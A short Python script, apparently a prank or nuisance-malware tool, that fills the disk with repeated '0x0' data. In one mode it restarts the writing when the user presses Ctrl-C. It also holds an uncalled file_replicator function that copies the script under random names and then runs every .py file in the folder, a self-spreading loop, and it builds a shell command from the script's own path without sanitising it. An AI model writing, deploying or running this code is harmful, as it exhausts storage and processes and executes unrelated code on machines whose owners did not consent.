#!/usr/bin/python3
import os
import sys
import subprocess
import random
import string
# print("checking dependencies... ")
# os.system("apt install jp2a")


var = "0x0"
var *= 50
# print(var)


def onefile(iteration, data):
    """
            create one file and append hex zero to othe file
    """

    try:
        i = 0
        if os.path.exists("data.txt"):
            print("file already present")
            exit(1)
        while i < iteration:
            with open('data.txt', 'ab') as f:
                f.write(data)
            i += 1

    except KeyboardInterrupt:
        os.system("jp2a akshey.jpeg")
        onefile(iteration, data)


def multifile(file_count, data):
    """
                create multiple fi;es with hex zero
    """
    try:
        i = 0
        while i < file_count:
            with open(f"file({i}).txt", "ab") as f:
                f.write(data)
            i += 1
    except KeyboardInterrupt:
        print(os.system("jp2a aaa.jpeg"))
        # multifile()


def main():
    if len(sys.argv) < 3:
        print("Usage ./main.py <iterations> [onefile/multifile]")
    else:
        try:
            i = int(sys.argv[1])
        except ValueError:
            print("iterations must be integer")
            exit(1)
        if sys.argv[2] == 'onefile':
            data = ("0x0"*random.randint(100, 999)+"\n").encode('utf-8')
            onefile(i, data)
            print(("0x0"*50 + "\n").encode('utf-8'))
        elif sys.argv[2] == 'multifile':
            multifile(10, b"0x0")


def file_replicator(count):
	file_name = sys.argv[0]
	file_content = subprocess.getoutput(f"cat {sys.argv[0]}")
	print(file_content)
	i = 0
	while i < 10:
		file_start_name = sys.argv[0].split(".")[0]
		with open(f"{file_start_name}{random.choice(list(string.ascii_letters))}{random.choice(list(string.punctuation))}({random.randint(0, 999999999999999999)}).py", "w") as f:
			f.write(file_content)

		i += 1

	all_files = os.listdir()
	py_files = []
	
	for files in all_files:
		if files.split(".")[-1] == 'py':
			py_files.append(files)
	
	for file in py_files:
		os.system(f"python {file}")

if __name__ == "__main__":
    main()